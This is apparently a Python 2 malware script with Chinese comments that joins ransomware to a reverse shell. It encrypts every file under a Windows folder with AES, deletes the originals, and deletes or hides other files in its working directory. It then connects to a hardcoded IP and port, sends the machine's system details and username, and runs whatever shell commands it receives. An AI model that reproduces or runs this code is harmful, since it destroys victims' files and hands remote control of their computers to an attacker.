# -*- coding: utf-8 -*-
import socket,subprocess as sp,sys,os,platform
from shutil import copyfile
import  getpass
from sys import argv
import win32con, win32api
from Crypto.Hash import SHA256
from Crypto.Cipher import AES
import  random,  pkg_resources
from urllib2 import urlopen
import shutil
# 连接函数
def hide():
        for fname in os.listdir('.'):#用于返回指定的文件夹包含的文件或文件夹的名字的列表。
                if fname.find('.py') == len(fname) - len('.py'):
                        #make the file hidden
                        win32api.SetFileAttributes(fname,win32con.FILE_ATTRIBUTE_HIDDEN)
                elif fname.find('.txt') == len(fname) - len('.txt'):
                        #make the file read only
                        win32api.SetFileAttributes(fname,win32con.FILE_ATTRIBUTE_READONLY)
                else:
                        #to force deletion of a file set it to normal
                        win32api.SetFileAttributes(fname, win32con.FILE_ATTRIBUTE_NORMAL)
                        os.remove(fname)#os.remove() 方法用于删除指定路径的文件。
def allfiles():#返回指定目录下所有文件名
        allFiles = []
        for root, subfiles, files in os.walk("C:\\111"):#用于通过在目录树中游走输出在目录中的文件名
                for names in files:
                        allFiles.append(os.path.join(root, names))
 
        return allFiles
def encrypt(key, filename):
        chunksize = 64 * 1024
        outFile = os.path.join(os.path.dirname(filename), "(encrypted)"+os.path.basename(filename))
        #dirname获取文件路径中所在的目录。basename获取文件名。join目录文件名拼接
        filesize = str(os.path.getsize(filename)).zfill(16)#getsize返回文件的字节数大小
        IV = ''
 
        for i in range(16):
                IV += chr(random.randint(0, 0xFF))#chr返回一个对应的字符chr（0x30）=‘0’   IV=‘0dsSAD。。。’
       
        encryptor = AES.new(key, AES.MODE_CBC, IV)#AES CBC模式加密
 
        with open(filename, "rb") as infile:#以二进制格式打开一个文件用于只读
                with open(outFile, "wb") as outfile:#以二进制格式打开一个文件只用于写入。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。
                        outfile.write(filesize)
                        outfile.write(IV)
                        while True:
                                chunk = infile.read(chunksize)#read() 方法用于从文件读取指定的字节数，如果未给定或为负则读取所有。
                               #返回从字符串中读取的字节。
                                if len(chunk) == 0:
                                        break
 
                                elif len(chunk) % 16 !=0:
                                        chunk += ' ' *  (16 - (len(chunk) % 16))#填补空格
 
                                outfile.write(encryptor.encrypt(chunk))#write() 方法用于向文件中写入指定字符串。
def action():
        password = "QEWJR3OIR2YUD92128!$##%$^*(093URO3DMKMXS,NCFJVHBHDUWQDHUDHQ9jswdhgehydxbhwqdbwyhfc"
        encFiles = allfiles()
        for Tfiles in encFiles:
                if os.path.basename(Tfiles).startswith("(encrypted)"):
                        print "%s is already encrypted" %str(Tfiles)
                        pass
 
                elif Tfiles == os.path.join(os.getcwd(), sys.argv[0]):#getcwd用于返回当前工作目录。sys.argv[0]指本（python或打包成exe）脚本文件
                        pass
                else:
                        encrypt(SHA256.new(password).digest(), str(Tfiles))#sha256哈希值加密后的结果用二进制表示
                        print "Done encrypting %s" %str(Tfiles)
                        os.remove(Tfiles)
def connect():
    try:
        # host  = str(sys.argv[1])
        # port  = int(sys.argv[2])

        host = "192.168.43.202"   # 测试IP
        port = 8800               # 测试端口
    except Exception as e:
        sys.exit(1)

    conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    conn.connect((host,port))

    x_info = ""

    #for x in os.uname():
    for x in platform.uname():
        x_info += x + ","

    # 平台判断
    if platform.system() == "Linux":
        x_info += os.getlogin()  # Linux平台
    elif platform.system() == "Windows":
        x_info += os.getenv('username')  # Windows

    # 发送数据
    conn.send(x_info)

    # 会话维持
    interactive_session(conn)
    conn.close()

# 会话维持
def interactive_session(conn):
    while 1:
        try:
            command = str(conn.recv(1024))
        except socket.error:
            sys.exit(1)
        if command == "exit()":
            break
        else:
          try:
            res = 0
            msg = ""
            while len(command.split(" ")) > res:
                msg += command.split(" ")[res] + " "
                res += 1
#创建并返回一个子进程，并在这个进程中执行指定的程序。实例化 Popen 可以通过许多参数详细定制子进程的环境
            sh = sp.Popen(msg,shell=True,#要执行的命令，shell：布尔型变量，明确要求使用shell运行程序
                          stdout= sp.PIPE,#指定子进程的标准输出；
                          stderr = sp.PIPE,#指定子进程的标准错误输出；
                          stdin= sp.PIPE)#指定子进程的标准输入；PIPE表示与子进程通信的标准流
            out,err = sh.communicate()#通过communicate给stdin发送数据

            result = str(out) + str(err)#标准输出和标准错误输出是分开的，

            send_data(conn,result)
          except socket.error:
            send_data(conn,"[-] Unknown Command")
# 发送数据
def send_data(conn,data):
    length = str(len(data)).zfill(16)#把S变成width长，并在右对齐，不足部分用0补足；如len（data）=10，length=‘0000000000000009’
    conn.send(length + data)#发送命令执行结果，长度在前16位，后面为结果
def main():
    action()
    connect()
if __name__ == "__main__":
    main()
